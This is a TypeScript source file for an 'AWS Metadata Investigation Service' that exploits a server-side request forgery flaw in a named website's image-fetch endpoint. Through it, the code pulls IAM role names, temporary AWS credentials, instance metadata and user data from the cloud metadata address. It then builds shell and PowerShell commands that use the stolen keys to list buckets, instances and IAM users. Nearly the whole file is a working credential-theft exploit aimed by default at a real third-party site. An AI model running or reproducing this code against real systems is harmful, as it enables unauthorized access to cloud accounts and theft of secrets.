// AWS Metadata Investigation Service
// Handles SSRF attacks and AWS credential extraction

export interface AWSCredentials {
  Code: string;
  LastUpdated: string;
  Type: string;
  AccessKeyId: string;
  SecretAccessKey: string;
  Token: string;
  Expiration?: string;
}

export interface SSRFResult {
  url: string;
  method: string;
  status: number;
  response: any;
  headers: Record<string, string>;
  timestamp: Date;
  success: boolean;
  error?: string;
}

export class AWSMetadataService {
  private baseUrl: string;
  private results: SSRFResult[] = [];

  constructor(baseUrl: string = 'https://partidulaur.ro/api/fetch_image') {
    this.baseUrl = baseUrl;
  }

  // Extract AWS metadata via SSRF
  async extractAWSCredentials(): Promise<SSRFResult> {
    const targetUrl = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/';
    
    try {
      const response = await fetch(`${this.baseUrl}?url=${encodeURIComponent(targetUrl)}`, {
        method: 'GET',
        headers: {
          'Accept': 'application/json',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });

      const responseText = await response.text();
      let responseData: any;

      try {
        responseData = JSON.parse(responseText);
      } catch {
        responseData = responseText;
      }

      const result: SSRFResult = {
        url: targetUrl,
        method: 'GET',
        status: response.status,
        response: responseData,
        headers: this.extractHeaders(response),
        timestamp: new Date(),
        success: response.ok
      };

      this.results.push(result);
      return result;

    } catch (error: any) {
      const result: SSRFResult = {
        url: targetUrl,
        method: 'GET',
        status: 0,
        response: null,
        headers: {},
        timestamp: new Date(),
        success: false,
        error: error.message
      };

      this.results.push(result);
      return result;
    }
  }

  // Get IAM role name first
  async getIAMRole(): Promise<SSRFResult> {
    const targetUrl = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/';
    
    try {
      const response = await fetch(`${this.baseUrl}?url=${encodeURIComponent(targetUrl)}`, {
        method: 'GET',
        headers: {
          'Accept': 'text/plain',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });

      const responseText = await response.text();

      const result: SSRFResult = {
        url: targetUrl,
        method: 'GET',
        status: response.status,
        response: responseText.trim(),
        headers: this.extractHeaders(response),
        timestamp: new Date(),
        success: response.ok
      };

      this.results.push(result);
      return result;

    } catch (error: any) {
      const result: SSRFResult = {
        url: targetUrl,
        method: 'GET',
        status: 0,
        response: null,
        headers: {},
        timestamp: new Date(),
        success: false,
        error: error.message
      };

      this.results.push(result);
      return result;
    }
  }

  // Extract credentials for specific role
  async extractCredentialsForRole(roleName: string): Promise<SSRFResult> {
    const targetUrl = `http://169.254.169.254/latest/meta-data/iam/security-credentials/${roleName}`;
    
    try {
      const response = await fetch(`${this.baseUrl}?url=${encodeURIComponent(targetUrl)}`, {
        method: 'GET',
        headers: {
          'Accept': 'application/json',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });

      const responseText = await response.text();
      let credentials: AWSCredentials;

      try {
        credentials = JSON.parse(responseText);
      } catch {
        credentials = {
          Code: 'Error',
          LastUpdated: '',
          Type: '',
          AccessKeyId: '',
          SecretAccessKey: '',
          Token: '',
          Expiration: ''
        };
      }

      const result: SSRFResult = {
        url: targetUrl,
        method: 'GET',
        status: response.status,
        response: credentials,
        headers: this.extractHeaders(response),
        timestamp: new Date(),
        success: response.ok && credentials.Code === 'Success'
      };

      this.results.push(result);
      return result;

    } catch (error: any) {
      const result: SSRFResult = {
        url: targetUrl,
        method: 'GET',
        status: 0,
        response: null,
        headers: {},
        timestamp: new Date(),
        success: false,
        error: error.message
      };

      this.results.push(result);
      return result;
    }
  }

  // Get instance metadata
  async getInstanceMetadata(): Promise<SSRFResult> {
    const targetUrl = 'http://169.254.169.254/latest/meta-data/';
    
    try {
      const response = await fetch(`${this.baseUrl}?url=${encodeURIComponent(targetUrl)}`, {
        method: 'GET',
        headers: {
          'Accept': 'text/plain',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });

      const responseText = await response.text();

      const result: SSRFResult = {
        url: targetUrl,
        method: 'GET',
        status: response.status,
        response: responseText,
        headers: this.extractHeaders(response),
        timestamp: new Date(),
        success: response.ok
      };

      this.results.push(result);
      return result;

    } catch (error: any) {
      const result: SSRFResult = {
        url: targetUrl,
        method: 'GET',
        status: 0,
        response: null,
        headers: {},
        timestamp: new Date(),
        success: false,
        error: error.message
      };

      this.results.push(result);
      return result;
    }
  }

  // Get user data
  async getUserData(): Promise<SSRFResult> {
    const targetUrl = 'http://169.254.169.254/latest/user-data/';
    
    try {
      const response = await fetch(`${this.baseUrl}?url=${encodeURIComponent(targetUrl)}`, {
        method: 'GET',
        headers: {
          'Accept': 'text/plain',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });

      const responseText = await response.text();

      const result: SSRFResult = {
        url: targetUrl,
        method: 'GET',
        status: response.status,
        response: responseText,
        headers: this.extractHeaders(response),
        timestamp: new Date(),
        success: response.ok
      };

      this.results.push(result);
      return result;

    } catch (error: any) {
      const result: SSRFResult = {
        url: targetUrl,
        method: 'GET',
        status: 0,
        response: null,
        headers: {},
        timestamp: new Date(),
        success: false,
        error: error.message
      };

      this.results.push(result);
      return result;
    }
  }

  // Full AWS metadata extraction
  async fullAWSExtraction(): Promise<{
    iamRole: SSRFResult;
    credentials: SSRFResult;
    instanceMetadata: SSRFResult;
    userData: SSRFResult;
  }> {
    console.log('[AWS_METADATA] Starting full extraction...');

    // Step 1: Get IAM role
    const iamRoleResult = await this.getIAMRole();
    console.log('[AWS_METADATA] IAM Role result:', iamRoleResult.success ? iamRoleResult.response : 'Failed');

    // Step 2: Get credentials for the role
    let credentialsResult: SSRFResult;
    if (iamRoleResult.success && typeof iamRoleResult.response === 'string') {
      const roleName = iamRoleResult.response.trim();
      credentialsResult = await this.extractCredentialsForRole(roleName);
    } else {
      // Try direct extraction
      credentialsResult = await this.extractAWSCredentials();
    }
    console.log('[AWS_METADATA] Credentials result:', credentialsResult.success ? 'Success' : 'Failed');

    // Step 3: Get instance metadata
    const instanceMetadataResult = await this.getInstanceMetadata();
    console.log('[AWS_METADATA] Instance metadata result:', instanceMetadataResult.success ? 'Success' : 'Failed');

    // Step 4: Get user data
    const userDataResult = await this.getUserData();
    console.log('[AWS_METADATA] User data result:', userDataResult.success ? 'Success' : 'Failed');

    return {
      iamRole: iamRoleResult,
      credentials: credentialsResult,
      instanceMetadata: instanceMetadataResult,
      userData: userDataResult
    };
  }

  // Generate AWS CLI commands from extracted credentials
  generateAWSCommands(credentials: AWSCredentials): string[] {
    return [
      `export AWS_ACCESS_KEY_ID=${credentials.AccessKeyId}`,
      `export AWS_SECRET_ACCESS_KEY="${credentials.SecretAccessKey}"`,
      `export AWS_SESSION_TOKEN="${credentials.Token}"`,
      `export AWS_DEFAULT_REGION=us-east-1`,
      '',
      '# List S3 buckets',
      'aws s3 ls',
      '',
      '# List EC2 instances',
      'aws ec2 describe-instances',
      '',
      '# List IAM users',
      'aws iam list-users',
      '',
      '# Get caller identity',
      'aws sts get-caller-identity'
    ];
  }

  // Generate PowerShell commands for Windows
  generatePowerShellCommands(credentials: AWSCredentials): string[] {
    return [
      `$env:AWS_ACCESS_KEY_ID="${credentials.AccessKeyId}"`,
      `$env:AWS_SECRET_ACCESS_KEY="${credentials.SecretAccessKey}"`,
      `$env:AWS_SESSION_TOKEN="${credentials.Token}"`,
      `$env:AWS_DEFAULT_REGION="us-east-1"`,
      '',
      '# List S3 buckets',
      'aws s3 ls',
      '',
      '# List EC2 instances',
      'aws ec2 describe-instances',
      '',
      '# List IAM users',
      'aws iam list-users',
      '',
      '# Get caller identity',
      'aws sts get-caller-identity'
    ];
  }

  // Validate extracted credentials
  validateCredentials(credentials: AWSCredentials): {
    isValid: boolean;
    issues: string[];
    recommendations: string[];
  } {
    const issues: string[] = [];
    const recommendations: string[] = [];

    // Check Access Key ID format
    if (!credentials.AccessKeyId.startsWith('AKIA')) {
      issues.push('Access Key ID format is invalid');
    }

    // Check Secret Access Key length
    if (credentials.SecretAccessKey.length < 20) {
      issues.push('Secret Access Key seems too short');
    }

    // Check if token is present
    if (!credentials.Token || credentials.Token.length === 0) {
      issues.push('Session token is missing');
    }

    // Check expiration
    if (credentials.Expiration) {
      const expiration = new Date(credentials.Expiration);
      const now = new Date();
      if (expiration < now) {
        issues.push('Credentials have expired');
        recommendations.push('Extract fresh credentials');
      } else {
        const timeToExpiry = expiration.getTime() - now.getTime();
        const hoursToExpiry = timeToExpiry / (1000 * 60 * 60);
        if (hoursToExpiry < 1) {
          recommendations.push('Credentials expire soon - extract fresh ones');
        }
      }
    }

    return {
      isValid: issues.length === 0,
      issues,
      recommendations
    };
  }

  // Get all results
  getResults(): SSRFResult[] {
    return this.results;
  }

  // Clear results
  clearResults(): void {
    this.results = [];
  }

  // Export results to JSON
  exportResults(): string {
    return JSON.stringify({
      extractionDate: new Date().toISOString(),
      baseUrl: this.baseUrl,
      results: this.results,
      summary: {
        total: this.results.length,
        successful: this.results.filter(r => r.success).length,
        failed: this.results.filter(r => !r.success).length
      }
    }, null, 2);
  }

  private extractHeaders(response: Response): Record<string, string> {
    const headers: Record<string, string> = {};
    response.headers.forEach((value, key) => {
      headers[key] = value;
    });
    return headers;
  }
}

// Singleton instance
export const awsMetadataService = new AWSMetadataService();
